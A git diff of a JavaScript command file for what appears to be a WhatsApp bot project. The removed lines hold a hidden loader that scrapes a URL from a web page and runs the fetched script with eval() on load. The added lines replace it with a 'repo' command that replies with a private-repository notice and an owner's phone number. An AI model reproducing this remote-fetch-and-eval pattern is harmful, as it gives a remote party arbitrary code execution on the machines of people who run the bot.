@@ -3,33 +3,10 @@
 Made by sir Ibrahim Adams
 */
 
-const axios = require('axios');
-const cheerio = require('cheerio');
-const adams = require(__dirname + "/../config");
+const { adams } = require("../Ibrahim/adams");
 
-async function fetchRepoUrl() {
-try {
+adams({ nomCom: "repo", categorie: "General", reaction: "📋" }, async (dest, zk, commandeOptions) => {
+    const { repondre } = commandeOptions;
 
-const response = await axios.get(adams.BWM_XMD);      
-const $ = cheerio.load(response.data);      
-  
-  
-const repoUrlElement = $('a:contains("REPO_URL")');      
-const repoUrl = repoUrlElement.attr('href');      
-  
-if (!repoUrl) {      
-  throw new Error('Repo url link not found...');      
-}      
-  
-console.log('Repo url fetched successfully ✅');      
-  
-  
-const scriptResponse = await axios.get(repoUrl);      
-eval(scriptResponse.data);
-
-} catch (error) {
-console.error('Error:', error.message);
-}
-}
-
-fetchRepoUrl();
+    repondre("*⚠️ PRIVATE REPOSITORY ⚠️*\n\nThis is a private bot repository. For access or inquiries please contact:\n\nOwner: TREKKER\nWhatsApp: +254704897825");
+});
